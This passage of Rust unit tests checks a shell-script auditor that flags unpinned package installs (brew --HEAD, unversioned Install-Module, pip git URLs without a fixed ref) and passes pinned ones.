        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "npx typescript@5.6.0",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_brew_head_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "brew install ffmpeg --HEAD",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("--HEAD"));
    }

    #[test]
    fn shell_scan_brew_install_without_head_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "brew install ffmpeg",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_ps_install_module_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "Install-Module -Name Pester -Force",
            "test.ps1",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
    }

    #[test]
    fn shell_scan_ps_install_module_required_version_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "Install-Module -Name Pester -RequiredVersion 5.3.1 -Force",
            "test.ps1",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_pip_git_url_unversioned_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "pip install git+https://github.com/owner/repo.git",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("git+URL"));
    }

    #[test]
    fn shell_scan_pip_git_url_with_ref_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "pip install git+https://github.com/owner/repo.git@v1.2.3",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_pip_git_url_branch_ref_is_finding() {
        // `@main` tracks the branch HEAD — not a pin, so it must still fire.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "pip install git+https://github.com/owner/repo.git@main",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("git+URL"));
    }
}
